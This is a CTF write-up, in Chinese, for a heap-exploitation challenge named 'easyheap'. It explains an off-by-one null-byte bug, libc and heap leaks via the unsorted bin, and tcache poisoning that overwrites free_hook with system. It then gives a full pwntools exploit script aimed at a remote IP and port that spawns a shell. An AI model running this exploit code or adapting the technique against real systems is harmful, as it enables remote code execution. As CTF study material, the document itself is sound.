# easyheap
很明显add时，size获得时有逻辑问题

前后没有进行更新，导致可以任意偏移写一字节"\x00"

利用0x20大小的chunk，和size逻辑问题绕过memset和00截断，直接利用unsorted bin进行leak

而后通过任意偏移写一字节"\x00"，布置好堆布局，恰好修改到一个tcache_free_chunk的fd低字节为00，即可分配到一个构造好chunk的位置，这里我修改fd后恰好指向chunk本身，人为构造了double free的堆布局

而后tcache attack修改free_hook为system即可在free("/bin/sh")时getshell

### EXP:
```
from pwn import *
context.log_level="debug"
def add(size,note):
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(size))
    p.sendafter(": ",note)

def show(index):
   p.sendlineafter(">> ","2")
   p.sendlineafter(": ",str(index))

def delete(index):
   p.sendlineafter(">> ","3")
   p.sendlineafter(": ",str(index))
#p=process("./easyheap")
p=remote("123.57.209.176",30774)
add(3,"aaa")
add(3,"aaa")
delete(0)
delete(1)

p.sendlineafter(">> ","1")
p.sendlineafter(": ",str(0x100))
p.sendlineafter(": ",str(1))
p.sendafter(": ","a")

show(0)
p.recvuntil("Content: ")
heap=u64(p.recv(6)+"\x00\x00")
print hex(heap)
delete(0)

for i in range(8):
    add(0x80,"a"*0x80)
for i in range(8):
    delete(7-i)
add(8,"/bin/sh\x00")
add(3,"aaa")

p.sendlineafter(">> ","1")
p.sendlineafter(": ",str(0x100))
p.sendlineafter(": ",str(1))
p.sendafter(": ","a")

show(2)
p.recvuntil("Content: ")
libc=u64(p.recv(6)+"\x00\x00")+0x7ffff7dd7000-0x7ffff7fc2c61
print hex(libc)

p.sendlineafter(">> ","1")
p.sendlineafter(": ",str(0x91))
p.sendlineafter(": ",str(0x80))
p.sendafter(": ","b"*0x80)

add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
add(0x80,p64(libc+0x0055410)+"\n")
delete(0)
p.interactive()
```